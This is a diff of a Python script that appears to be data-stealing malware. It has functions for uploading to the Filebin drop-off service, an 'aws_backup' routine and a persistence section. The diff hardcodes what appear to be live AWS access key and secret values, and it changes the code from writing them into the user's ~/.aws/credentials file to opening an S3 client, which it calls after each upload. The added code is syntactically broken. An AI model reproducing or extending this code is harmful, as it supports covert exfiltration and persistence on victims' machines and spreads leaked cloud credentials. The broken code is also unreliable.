@@ -82,18 +82,17 @@ def aws_backup():
     except ModuleNotFoundError:
         print("boto3 not found")
     else:
-        user_home = os.path.expanduser("~")
-        with open(user_home+".aws/credentials", "w") as output:
-            output.write("[default]")
-            output.write("\n")
-            output.write("aws_access_key_id =  AKIA2FYSKELQWHWU37NZ")
-            output.write("\n")
-            output.write("aws_secret_access_key =  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")
+        client = boto3.client(
+            "s3",
+            aws_access_key_id =  AKIA2FYSKELQWHWU37NZ
+            aws_secret_access_key =  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
+        )
     pass
 
 def make_global(lib):
     global requests, boto3
-    requests, boto3 = __import__(lib, globals(), locals())
+    requests = __import__(lib, globals(), locals())
+    boto3 = __import__(lib, globals(), locals())
 
 def upload(): 
     # second storage (upload to drop off box - Filebin)
@@ -115,6 +114,8 @@ def upload():
     else:
         print("File upload failed. Status code:", response.status_code)
         print("Error message:", response.text)
+
+    aws_backup()
 
 # func presistence()
 # Persistence
